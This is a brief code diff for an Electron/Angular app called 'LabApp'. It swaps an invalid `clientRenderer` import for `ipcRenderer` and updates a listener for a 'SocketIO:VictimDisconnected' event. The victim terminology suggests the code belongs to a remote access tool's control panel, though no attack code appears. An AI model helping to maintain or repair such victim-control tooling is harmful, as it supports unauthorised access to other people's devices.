@@ -1,5 +1,5 @@
 const { remote } = require('electron');
-const { clientRenderer } = require('electron');
+const { ipcRenderer } = require('electron');
 var app = angular.module('LabApp', ['ngRoute', 'infinite-scroll']);
 var homeDir = require('homedir');
 var fs = require('fs-extra');
@@ -72,7 +72,7 @@ app.controller('LabCtrl', function($scope, $rootScope, $location) {
     }
   };
 
-  clientRenderer.on('SocketIO:VictimDisconnected', function(event) {
+  ipcRenderer.on('SocketIO:VictimDisconnected', function(event) {
     $rootScope.Log('Victim Disconnected', 0);
   });
 
